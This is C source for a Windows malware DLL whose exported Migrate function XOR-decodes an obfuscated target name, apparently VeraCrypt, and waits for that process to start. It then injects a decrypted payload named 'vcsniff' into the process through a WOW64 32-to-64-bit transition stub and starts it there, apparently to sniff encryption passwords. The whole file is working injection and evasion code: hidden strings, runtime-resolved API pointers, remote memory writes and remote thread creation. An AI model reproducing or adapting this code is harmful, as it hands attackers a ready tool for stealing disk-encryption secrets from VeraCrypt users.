#include <Windows.h>

#include "execute64.bin.inc"
#include "wownative.bin.inc"

#include "../vcsniff/vcsniff.bin.inc"

#define UTILS_IMPLEMENTATION
#include "../utils.h"

typedef struct _WOW64CONTEXT
{
    union
    {
        HANDLE hProcess;
        BYTE bPadding2[8];
    } h;

    union
    {
        LPVOID lpvStartAddress;
        BYTE bPadding1[8];
    } s;

    union
    {
        LPVOID lpParameter;
        BYTE bPadding2[8];
    } p;

    union
    {
        HANDLE hThread;
        BYTE hPadding2[8];
    } t;
} WOW64CONTEXT, *LPWOW64CONTEXT;

typedef BOOL(WINAPI *X64FUNCTION)(DWORD dwParameter);
typedef DWORD(WINAPI *EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter);

__declspec(dllexport) void Migrate()
{
    EXECUTEX64 Execute64 = NULL;
    X64FUNCTION X64Function = NULL;

    LPVOID lpvPayloadMem = NULL;
    HMODULE hKernel = MyGetKernelModuleHandle();

    if (hKernel == NULL)
    {
        goto shutdown;
    }

    PopulateKernelFunctionPtrsByName(hKernel);

    char cVeraCrypt[] = {0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0};
    MyXor(cVeraCrypt, 13, key, 5);

    DWORD dwProcID = -1;
    while (1)
    {
        dwProcID = FindTargetProcessID(cVeraCrypt);

        if (dwProcID != -1)
            break;

        pSleep(5000);
    }

    HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
    if (hProc == NULL)
    {
        goto shutdown;
    }

    lpvPayloadMem = pVirtualAllocEx(hProc, NULL, vcsniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (lpvPayloadMem == NULL)
    {
        goto shutdown;
    }

    MyXor(vcsniff_data, vcsniff_data_len, key, 5);

    if (!pWriteProcessMemory(hProc, lpvPayloadMem, vcsniff_data, vcsniff_data_len, NULL))
    {
        goto shutdown;
    }

    DWORD dwOldProtect = 0;
    if (!pVirtualProtectEx(hProc, lpvPayloadMem, vcsniff_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        goto shutdown;
    }

    Execute64 = (EXECUTEX64)pVirtualAlloc(NULL, execute64_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (Execute64 == NULL)
    {
        goto shutdown;
    }

    MyXor(execute64_data, execute64_data_len, key, 5);
    MyMemCpy(Execute64, execute64_data, execute64_data_len);

    if (!pVirtualProtect(Execute64, execute64_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        goto shutdown;
    }

    X64Function = (X64FUNCTION)pVirtualAlloc(NULL, wownative_data_len + sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (X64Function == NULL)
    {
        goto shutdown;
    }

    MyXor(wownative_data, wownative_data_len, key, 5);
    MyMemCpy(X64Function, wownative_data, wownative_data_len);

    if (!pVirtualProtect(X64Function, wownative_data_len + sizeof(WOW64CONTEXT), PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
        goto shutdown;
    }

    WOW64CONTEXT *ctx = (WOW64CONTEXT *)((ULONG_PTR)X64Function + wownative_data_len);
    ctx->h.hProcess = hProc;
    ctx->s.lpvStartAddress = lpvPayloadMem;
    ctx->p.lpParameter = 0;
    ctx->t.hThread = NULL;

    Execute64(X64Function, (DWORD)ctx);

    if (ctx->t.hThread)
    {
        pResumeThread(ctx->t.hThread);
    }

shutdown:
    return;
}

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        break;

    case DLL_PROCESS_DETACH:
        break;

    default:
        break;
    }

    return TRUE;
}
